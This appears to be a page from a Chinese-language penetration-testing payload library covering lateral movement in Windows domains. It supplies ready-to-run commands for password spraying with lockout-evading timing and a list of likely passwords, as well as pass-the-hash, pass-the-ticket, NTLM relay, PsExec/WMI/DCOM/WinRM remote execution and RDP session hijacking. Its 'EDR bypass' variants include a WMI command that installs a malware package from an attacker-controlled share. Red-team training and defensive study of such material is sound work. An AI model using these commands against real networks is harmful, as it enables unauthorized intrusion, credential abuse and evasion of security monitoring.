# 内网/后渗透 — 横向移动 payload 库

> 父文档:[00-index.md](00-index.md) · ⚠️ 渗透测试场景下大多受限,见 [../../compliance.md](../../compliance.md)
> 涵盖:远程执行对比 / SMB / WMI / PsExec / WinRM / PtH / PtT / 密码喷射 / 凭据喷射

---

## Impacket 远程执行工具对比

| 工具 | 端口 | 原理 | 隐蔽性 | 磁盘痕迹 | 适用场景 |
|------|------|------|--------|---------|---------|
| **psexec.py** | 445 | 上传 exe → 创建服务 → 执行 → 删服务 | ⭐⭐ | 有（服务+exe） | 不关心检测时 |
| **smbexec.py** | 445 | SMB 管道 + 批处理脚本 | ⭐⭐⭐ | 有（bat临时文件） | 比 psexec 隐蔽 |
| **wmiexec.py** | 135 | WMI Win32_Process Create | ⭐⭐⭐ | 无（仅内存） | 不落地文件时首选 |
| **atexec.py** | 445 | 计划任务（AT 命令） | ⭐⭐⭐ | 有（任务残留） | 需要计划任务触发 |
| **dcomexec.py** | 135 | DCOM 对象激活 | ⭐⭐⭐⭐ | 无 | WMI 被监控时首选 |
| **evil-winrm** | 5985/5986 | WinRM（Powershell Remoting） | ⭐⭐⭐⭐ | 无 | 现代环境，有 WinRM |

**选择策略：**
```
1. 不关心检测（如 CTF 或已到最终阶段）→ psexec.py
2. 需要隐蔽（EDR 环境）→ wmiexec.py → dcomexec.py → evil-winrm
3. WinRM 启用（端口 5985 开放）→ evil-winrm（最"合法"的远程管理）
4. 需要 Kerberos 认证 → 加 -k -no-pass 参数
```

---

## 内网密码/凭据喷射策略  `cred-spray`
高效的域密码喷射与凭据验证方法
子类：**密码喷射** · tags: `password-spray` `cred-spray` `lateral`

**前置条件：** 内网访问；域用户列表；密码字典

### 锁定策略感知

```
# 1. 获取域密码锁定策略（决定喷射频率）
net accounts /domain
# 或
Get-ADDefaultDomainPasswordPolicy | select LockoutThreshold, LockoutDuration, LockoutObservationWindow

# 典型策略：
# LockoutThreshold = 5  → 每轮最多 4 次尝试（留 1 次余量）
# LockoutObservationWindow = 30 min → 每轮间隔 ≥ 35 分钟
# 每 35 分钟窗口：1 个密码 × 所有用户 = 安全喷射
# 每天上限：24h × 60/35 ≈ 41 个密码
```

### 密码喷射工具

```
# 1. CrackMapExec（SMB 喷射）
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Spring2024!' -d domain.com --continue-on-success

# 2. Kerbrute（Kerberos 喷射，不产生 4625 登录失败日志）
kerbrute passwordspray -d domain.com --dc DC_IP users.txt 'Spring2024!'

# 3. Invoke-DomainPasswordSpray (PowerShell)
Invoke-DomainPasswordSpray -UserList users.txt -Password 'Spring2024!' -OutFile sprayed.txt

# 4. Spray-Passwords (CrackMapExec 批量)
crackmapexec smb targets.txt -u users.txt -p passwords.txt -d domain.com --no-bruteforce
# --no-bruteforce 确保一个用户一个密码（而非暴力破解）
```

### 凭据验证（已知 hash/密码，验证在哪些机器上有效）

```
# 1. CrackMapExec 批量验证 hash
crackmapexec smb 192.168.1.0/24 -u Administrator -H 'NTLM_HASH' -d domain.com --local-auth

# 2. 验证成功后提取关键信息
crackmapexec smb 192.168.1.0/24 -u Administrator -H 'NTLM_HASH' --shares
crackmapexec smb 192.168.1.0/24 -u Administrator -H 'NTLM_HASH' --sessions
crackmapexec smb 192.168.1.0/24 -u Administrator -H 'NTLM_HASH' --loggedon-users

# 3. 验证成功后执行命令
crackmapexec smb 192.168.1.0/24 -u Administrator -H 'NTLM_HASH' -x 'whoami /all'
```

### 喷射节奏（高 OPSEC）

```
# 推荐节奏（以 LockoutThreshold=5 为例）：
# 09:00 → 密码1 'Spring2024!'                  （正常上班时间）
# 10:30 → 密码2 'Summer2024!'                  （间隔 1.5h）
# 13:00 → 密码3 'Winter2024!'                  （午休结束）
# 16:00 → 密码4 'P@ssw0rd'                     （快下班）

# 每轮选择一个高概率密码对全量用户喷射 1 次
# 每轮只产生 1 次失败登录/用户 → 远低于锁定阈值
# Kerberos Pre-Auth 方式（kerbrute）不产生 Windows 登录事件 → 更隐蔽
```

### 高概率密码字典（国内环境）

```
# 季节+年份模式（最常见）
Spring2024! / Summer2024! / Autumn2024! / Winter2024!
Spring@2024 / Summer@2024 / 2024Spring! / 2024Summer!

# 公司名+数字
<COMPANY>@2024 / <COMPANY>2024! / <COMPANY>#2024
<COMPANY>123 / <COMPANY>1234

# 键盘模式
Qwer1234! / 1qaz@WSX / P@ssw0rd
Aa123456! / Admin@123 / Password123!

# 国内特有模式
admin@888 / 123.com / admin888
```

---

### PsExec横向移动  `lateral-psexec`
使用PsExec进行横向移动
子类：**SMB** · tags: `psexec` `lateral` `smb` `windows`

**前置条件：** 目标机器开放445端口；拥有目标机器管理员凭证；ADMIN$共享可访问

**攻击链：**

**1. 基本使用**  _[linux]_
_使用Impacket的psexec.py连接目标_
```
psexec.py domain/user:password@target_ip
```

**2. 使用哈希连接**  _[linux]_
_使用NTLM哈希进行Pass-the-Hash_
```
psexec.py -hashes :NTLM_HASH domain/user@target_ip
```

**3. 执行命令**  _[linux]_
_在目标机器执行命令_
```
psexec.py domain/user:password@target_ip "whoami"
```

**4. Windows PsExec**  _[windows]_
_使用Sysinternals PsExec_
```
PsExec.exe \\target_ip -u domain\user -p password cmd.exe
```

**EDR 绕过变体：**

**1. 自定义服务名**
_使用自定义服务名避免检测_
```
psexec.py -service-name CustomService domain/user:password@target_ip
```

**2. SMBExec替代**
_使用smbexec.py，不写入磁盘_
```
smbexec.py domain/user:password@target_ip
```

**分析：** PsExec通过SMB协议在目标机器创建服务并执行命令，成功后可获得目标机器的Shell。

**OPSEC：** PsExec会在目标机器创建服务，容易被检测；服务名称和二进制文件可能触发告警；考虑使用更隐蔽的横向移动方式

---

### WMI横向移动  `lateral-wmi`
使用WMI进行横向移动
子类：**WMI** · tags: `wmi` `lateral` `windows` `remote`

**前置条件：** 目标机器开放135端口；拥有目标机器管理员凭证；WMI服务可访问

**攻击链：**

**1. WMI执行命令**  _[windows]_
_使用WMIC远程执行命令_
```
wmic /node:target_ip /user:domain\user /password:pass process call create "cmd.exe /c whoami"
```

**2. Impacket wmiexec**  _[linux]_
_使用Impacket的wmiexec.py_
```
wmiexec.py domain/user:password@target_ip
```

**3. 使用哈希**  _[linux]_
_Pass-the-Hash通过WMI_
```
wmiexec.py -hashes :NTLM_HASH domain/user@target_ip
```

**4. PowerShell WMI**  _[windows]_
_使用PowerShell WMI_
```
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName target_ip -Credential $cred
```

**EDR 绕过变体：**

**1. WMI事件订阅**
_通过WMI安装MSI包执行代码_
```
wmic /node:target_ip /user:domain\user /password:pass path win32_product call install /package:"\\attacker\share\malware.msi"
```

**分析：** WMI横向移动不会在目标机器创建服务，相对PsExec更隐蔽。

**OPSEC：** WMI执行不会留下明显的文件痕迹；但WMI活动可能被监控；命令输出通过临时文件获取

---

### Pass-the-Hash攻击  `pass-the-hash`
使用NTLM哈希进行身份验证
子类：**认证攻击** · tags: `pth` `ntlm` `hash` `authentication`

**前置条件：** 获取用户NTLM哈希；目标机器允许NTLM认证；目标机器开放SMB/WMI端口

**攻击链：**

**1. Impacket PtH**  _[linux]_
_使用Impacket进行PtH_
```
psexec.py -hashes :NTHASH domain/user@target_ip
```

**2. CrackMapExec PtH**  _[linux]_
_使用CrackMapExec进行PtH_
```
crackmapexec smb target_ip -u user -H NTHASH -d domain
```

**3. Windows PtH**  _[windows]_
_使用Mimikatz进行PtH_
```
sekurlsa::pth /user:Administrator /domain:target.com /ntlm:NTHASH
```

**4. PowerShell PtH**  _[windows]_
_使用PowerShell进行PtH_
```
Invoke-SMBClient -Domain domain -User user -Hash NTHASH -Target target_ip
```

**EDR 绕过变体：**

**1. Overpass-the-Hash**
_将哈希转换为Kerberos票据_
```
sekurlsa::pth /user:Administrator /domain:target.com /ntlm:NTHASH /run:cmd.exe
```

**分析：** PtH成功后可以该用户身份访问目标机器，无需明文密码。

**OPSEC：** PtH不会产生登录日志中的密码验证；但会留下网络登录日志；注意时间戳和来源IP

---

### NTLM Relay攻击  `ntlm-relay`
NTLM中继攻击技术
子类：**认证攻击** · tags: `ntlm` `relay` `smb` `authentication`

**前置条件：** 目标机器开放SMB端口；目标机器未启用SMB签名；可诱导目标机器认证

**攻击链：**

**1. Responder监听**  _[linux]_
_启动Responder监听NTLM认证_
```
responder -I eth0 -wrf
```

**2. ntlmrelayx攻击**  _[linux]_
_使用ntlmrelayx进行中继攻击_
```
ntlmrelayx.py -tf targets.txt -smb2support
```

**3. 中继到LDAP**  _[linux]_
_中继到LDAP进行权限提升_
```
ntlmrelayx.py -t ldap://dc_ip -smb2support --escalate-user user
```

**4. IPv6中继**  _[linux]_
_使用IPv6进行NTLM中继_
```
mitm6 -d domain.com & ntlmrelayx.py -t ldap://dc_ip -wh attacker_ip
```

**EDR 绕过变体：**

**1. Drop the MIC**
_移除MIC标志绕过签名验证_
```
ntlmrelayx.py -t smb://target --remove-mic
```

**分析：** NTLM Relay成功后可以获取目标机器的访问权限或提升域权限。

**OPSEC：** 需要目标机器未启用SMB签名；域控制器默认启用签名；IPv6中继更隐蔽

---

### WinRM横向移动  `lateral-winrm`
通过WinRM进行横向移动
子类：**WinRM** · tags: `winrm` `lateral` `powershell`

**前置条件：** WinRM启用；有效凭证

**攻击链：**

**1. PowerShell远程**  _[windows]_
_PowerShell远程会话_
```
Enter-PSSession -ComputerName target -Credential $cred
```

**2. 执行命令**  _[windows]_
_远程执行命令_
```
Invoke-Command -ComputerName target -ScriptBlock { whoami } -Credential $cred
```

**3. evil-winrm**  _[linux]_
_使用evil-winrm连接_
```
evil-winrm -i target -u user -p password
```

---

### DCOM横向移动  `lateral-dcom`
通过DCOM进行横向移动
子类：**DCOM** · tags: `dcom` `lateral` `com`

**前置条件：** DCOM启用；有效凭证

**攻击链：**

**1. MMC20.Application**  _[windows]_
_通过MMC DCOM执行命令_
```
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c whoami","7")
```

**2. ShellBrowserWindow**  _[windows]_
_通过ShellBrowserWindow执行_
```
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","target"))
$com.Document.Application.ShellExecute("cmd.exe","/c whoami","c:\windows\system32",$null,0)
```

**3. Excel DCOM**  _[windows]_
_通过Excel DCOM执行_
```
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","target"))
$com.DisplayAlerts = $false
$com.DDEInitiate("cmd","/c calc.exe")
```

---

### SSH横向移动  `lateral-ssh`
通过SSH进行横向移动
子类：**SSH** · tags: `ssh` `lateral` `linux`

**前置条件：** SSH服务；有效凭证

**攻击链：**

**1. SSH连接**  _[linux]_
_基础SSH连接_
```
ssh user@target
```

**2. SSH密钥认证**  _[linux]_
_使用私钥连接_
```
ssh -i private_key user@target
```

**3. SSH跳板**  _[linux]_
_通过跳板机连接_
```
ssh -J jump_host user@target
```

---

### RDP会话劫持  `rdp-hijack`
劫持已存在的RDP会话
子类：**RDP** · tags: `rdp` `hijack` `session`

**前置条件：** SYSTEM权限；存在RDP会话

**攻击链：**

**1. 列出会话**  _[windows]_
_列出所有用户会话_
```
query user
```

**2. 劫持会话**  _[windows]_
_劫持指定会话_
```
tscon SESSION_ID /dest:console
```

**3. 使用Mimikatz**  _[windows]_
_使用Mimikatz劫持_
```
ts::sessions
ts::remote /id:SESSION_ID
```

---

### Overpass-the-Hash  `overpass-the-hash`
使用哈希获取Kerberos票据
子类：**PtH** · tags: `pth` `kerberos` `hash`

**前置条件：** 用户NTLM哈希；域环境

**攻击链：**

**1. Mimikatz**  _[windows]_
_使用哈希获取Kerberos票据_
```
sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:HASH /ptt
```

**2. Rubeus**  _[windows]_
_使用Rubeus获取票据_
```
Rubeus.exe asktgt /user:Administrator /domain:domain.com /rc4:HASH /ptt
```

**3. Impacket**  _[linux]_
_获取Kerberos票据_
```
getTGT.py domain.com/user -hashes :HASH
```

---

### Pass-the-Ticket  `pass-the-ticket`
使用Kerberos票据进行横向移动
子类：**PtT** · tags: `ptt` `kerberos` `ticket`

**前置条件：** 有效Kerberos票据

**攻击链：**

**1. 导出票据**  _[windows]_
_从内存导出Kerberos票据_
```
sekurlsa::tickets /export
```

**2. 注入票据**  _[windows]_
_注入票据到当前会话_
```
kerberos::ptt ticket.kirbi
```

**3. Rubeus导入**  _[windows]_
_使用Rubeus注入票据_
```
Rubeus.exe ptt /ticket:base64ticket
```

---

### SMBExec横向移动  `lateral-smbexec`
通过SMB执行命令
子类：**SMB** · tags: `smb` `lateral` `exec`

**前置条件：** SMB访问权限；管理员权限

**攻击链：**

**1. Impacket smbexec**  _[linux]_
_使用smbexec执行命令_
```
smbexec.py domain/user:password@target
```

**2. 通过服务执行**  _[windows]_
_创建并启动服务_
```
sc \\target create evilsvc binPath= "cmd /c whoami"
sc \\target start evilsvc
sc \\target delete evilsvc
```

---

### ATExec横向移动  `lateral-atexec`
通过计划任务执行命令
子类：**计划任务** · tags: `at` `scheduled` `lateral`

**前置条件：** 计划任务权限；管理员权限

**攻击链：**

**1. Impacket atexec**  _[linux]_
_使用atexec执行命令_
```
atexec.py domain/user:password@target "whoami"
```

**2. schtasks**  _[windows]_
_创建远程计划任务_
```
schtasks /create /s target /tn "evil" /tr "cmd /c whoami" /sc once /st 00:00
```

---

### WinRS横向移动  `lateral-winrs`
通过WinRS执行远程命令
子类：**WinRS** · tags: `winrs` `lateral` `windows`

**前置条件：** WinRM启用；有效凭证

**攻击链：**

**1. 执行命令**  _[windows]_
_远程执行命令_
```
winrs -r:target -u:user -p:password "whoami"
```

**2. 获取Shell**  _[windows]_
_获取远程CMD_
```
winrs -r:target -u:user -p:password "cmd"
```

---

### Excel DCOM横向移动  `lateral-dcom-excel`
利用Excel DCOM进行横向移动
子类：**DCOM** · tags: `dcom` `excel` `lateral`

**前置条件：** 目标安装Excel；DCOM权限

**攻击链：**

**1. Excel DCOM激活**  _[windows]_
_激活Excel DCOM对象_
```
$com = [Type]::GetTypeFromProgID("Excel.Application","target.com")
$obj = [System.Activator]::CreateInstance($com)
$obj.Visible = $false
```

**2. 执行命令**  _[windows]_
_通过Excel执行命令_
```
$obj.Workbooks.Add()
$obj.Cells.Item(1,1) = "=CMD|/C calc.exe!A"
$obj.Run("calc.exe")
```

**3. Impacket DCOM**  _[linux]_
_使用Impacket执行_
```
python dcomexec.py -object Excel.Application domain/user:password@target.com
```

---

### MMC DCOM横向移动  `lateral-dcom-mmc`
利用MMC DCOM进行横向移动
子类：**DCOM** · tags: `dcom` `mmc` `lateral`

**前置条件：** 目标安装MMC；DCOM权限

**攻击链：**

**1. MMC20.Application**  _[windows]_
_使用MMC执行命令_
```
$com = [Type]::GetTypeFromProgID("MMC20.Application","target.com")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")
```

**2. Impacket执行**  _[linux]_
_使用Impacket_
```
python dcomexec.py -object MMC20.Application domain/user:password@target.com
```

---

### RDP Relay攻击  `rdp-relay`
RDP中继攻击技术
子类：**RDP** · tags: `rdp` `relay` `lateral`

**前置条件：** RDP服务可访问；存在NTLM认证

**攻击链：**

**1. 设置中继**  _[linux]_
_设置RDP中继服务器_
```
使用Impacket:
python ntlmrelayx.py -tf targets.txt -smb2support
或使用rdp_relay.py
```

**2. 诱导连接**
_诱导用户连接_
```
诱导用户连接到攻击者控制的RDP服务器:
1. 发送恶意RDP文件
2. 用户连接时中继到目标
```

**3. PetitPotam组合**  _[linux]_
_PetitPotam + RDP Relay_
```
python petitpotam.py -d domain -u user -p pass attacker_ip target_ip
结合NTLM中继攻击ADCS
```

---



---

← 回 [00-index.md](00-index.md) · 上一篇:[`10-credentials.md`](10-credentials.md) · 下一篇:[`12-privesc.md`](12-privesc.md)
